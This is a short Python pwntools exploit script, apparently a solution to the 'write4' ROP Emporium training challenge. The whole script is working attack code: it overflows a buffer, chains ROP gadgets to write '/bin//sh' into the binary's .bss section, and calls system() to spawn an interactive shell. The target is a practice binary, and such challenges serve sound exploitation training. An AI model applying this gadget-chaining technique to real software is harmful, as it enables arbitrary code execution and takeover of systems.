from pwn import *

e = ELF('./write4')
r = process("./write4")
#gdb.attach(r)

#0x400820 mov    QWORD PTR [r14],r15
#0x400890 pop r14; pop r15; ret; 
#0x400893 pop rdi; ret;
movr14r15 = 0x400820
popopret = 0x400890
poprdi = 0x400893
bss = e.bss()
print hex(bss)

payload = "A" * cyclic_find('kaaa')
payload += p64(popopret)
payload += p64(bss)
payload += "/bin//sh"
payload += p64(movr14r15)
payload += p64(poprdi)
payload += p64(bss)
payload += p64(e.symbols['system'])

r.sendlineafter("> ",payload)
r.interactive()